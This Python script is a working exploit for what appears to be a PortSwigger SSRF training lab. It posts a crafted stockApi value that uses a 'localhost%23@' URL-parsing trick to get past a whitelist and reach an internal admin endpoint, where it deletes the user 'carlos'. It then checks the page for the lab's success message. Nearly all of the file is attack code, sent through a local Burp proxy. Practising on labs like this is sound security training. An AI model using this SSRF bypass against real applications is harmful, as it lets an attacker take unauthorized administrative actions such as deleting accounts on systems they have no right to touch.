import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def delete_user(s, url, path, username):
    target_url = url + path
    payload = f"stockApi=http://localhost%23@stock.weliketoshop.net:8080/admin/delete?username={username}"
    r = s.post(target_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful deleted {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)


def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    delete_user(s, url, '/product/stock', 'carlos')
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()